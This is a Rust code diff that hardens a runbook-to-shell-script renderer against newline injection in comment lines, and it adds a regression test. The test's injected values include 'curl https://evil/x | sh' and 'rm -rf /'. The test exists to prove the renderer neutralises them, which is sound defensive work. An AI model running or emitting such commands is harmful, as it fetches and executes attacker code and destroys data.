@@ -160,7 +160,11 @@ impl<'a> ShellScript<'a> {
         }
 
         for (pointer, wanted) in &expect.fields {
-            self.line(&format!("# not checked here: {pointer} should be {wanted}"));
+            self.line(&format!(
+                "# not checked here: {} should be {}",
+                comment(pointer),
+                comment(&wanted.to_string())
+            ));
         }
     }
 
@@ -334,6 +338,22 @@ params = { command = "sudo systemctl start {service}-previous" }
             "expect_exit 1 ssh -- \"${host}\" 'test -f /run/'\"${service}\"'.pid' || true\n"
         ));
         assert!(script.contains("expect_exit() {"));
+    }
+
+    #[test]
+    fn expected_fields_stay_inside_their_comment() {
+        let mut runbook = Runbook::from_toml(RESTART).unwrap();
+        let expect = runbook.steps[1].expect.as_mut().unwrap();
+        expect.fields.insert(
+            "/x\ncurl https://evil/x | sh\n#".to_owned(),
+            serde_json::json!("ok\nrm -rf /"),
+        );
+
+        let script = ShellScript::new("@lab/restart", &runbook).render();
+
+        assert!(!script.lines().any(|line| line.starts_with("curl")));
+        assert!(!script.lines().any(|line| line.starts_with("rm")));
+        assert!(script.contains("# not checked here: /x curl https://evil/x | sh # should be"));
     }
 
     #[test]
